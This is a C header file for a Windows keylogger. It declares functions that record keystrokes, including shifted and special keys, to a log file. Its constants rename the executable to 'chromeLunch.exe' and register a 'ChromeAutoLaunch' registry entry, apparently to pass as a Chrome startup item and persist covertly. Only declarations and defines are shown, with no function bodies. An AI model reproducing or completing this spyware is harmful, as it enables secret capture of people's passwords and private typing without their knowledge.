#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <direct.h>

/* Defines */
#define LOGFILE "log.txt"
#define OLDFILE "KeyLogger.exe"
#define NEWFILE "chromeLunch.exe"
#define REGISTERY_NAME "ChromeAutoLaunch_9A8B7C6D12E4F9A27B3A7F5C4D9A6B8F2"
#define KEY_PRESSED 0x8000
#define CAPSLOCK_MASK 0x0001

/* functions */
/**
 * Logs the input string to the log file.
 *
 * @param input The string to be logged.
 */
void logKey(const char *input);

/**
 * Handles special keys and modifier keys.
 *
 * @param key The key code.
 * @return 1 if the key is handled as a special key (or a modifier) and no further logging is needed, 0 otherwise.
 */
int handleSpecialKeys(int key);

/**
 * Maps a key code to its shifted equivalent.
 *
 * @param key The key code.
 * @return The corresponding shifted character.
 */
char mapWithShift(int key);

/**
 * Handles key press events by logging the appropriate character.
 *
 * @param key The key code.
 */
void handleKeyPress(int key);

/**
 * Handles key release events by updating modifier flags.
 *
 * @param key The key code.
 */
void handleKeyRelease(int key);

#endif // KEYLOGGER_H
